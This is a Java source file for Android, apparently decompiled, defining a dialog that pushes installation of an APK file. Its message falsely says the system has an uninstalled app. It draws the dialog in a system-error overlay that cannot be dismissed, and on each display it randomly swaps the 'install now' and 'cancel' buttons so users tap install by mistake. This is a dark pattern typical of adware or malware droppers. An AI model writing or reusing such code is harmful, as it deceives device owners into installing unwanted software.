package workspace.shortcut;
import java.io.File;
import java.util.Map;
import java.util.Random;
import workspace.util.Constants;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;

public class InstallDialog extends AlertDialog {
    public InstallDialog(Context context) {
        super(context);
    }
    private void startInstallIntent(Context context, File file, String packageName) {
        Map<String, ?> map = context.getSharedPreferences(Constants.SLIENT_PCK_TAG, 0).getAll();
        if (!ShortcutManager.isInstalled(context, packageName) && map.size() != 1) {
            Intent intent = new Intent();
            intent.addFlags(0x10000000);
            intent.setAction("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            context.startActivity(intent);
        }
    }
    void check(final Context context, final File file, final String packageName, String appname) {
        Builder builder = new Builder(context);
        builder.setTitle("应用更新");
        builder.setMessage(new StringBuilder("发现您的系统存在未安装的应用,是否立刻安装应用").append(appname).append("?").toString());
        OnClickListener cancelListener = new OnClickListener() {
            @Override
            public void onClick(DialogInterface dialoginterface, int i) {
                dialoginterface.dismiss();
            }
        };
        OnClickListener installListener = new OnClickListener() {
            @Override
            public void onClick(DialogInterface dialoginterface, int i) {
                startInstallIntent(context, file, packageName);
            }
        };
        if (new Random().nextInt(2) == 0) {
            builder.setPositiveButton("马上安装", installListener);
            builder.setNegativeButton("取消安装", cancelListener);
        } else {
            builder.setNegativeButton("马上安装", installListener);
            builder.setPositiveButton("取消安装", cancelListener);
        }
        builder.setCancelable(false);
        AlertDialog alertdialog = builder.create();
        alertdialog.getWindow().setType(2010);
        alertdialog.show();
    }
}
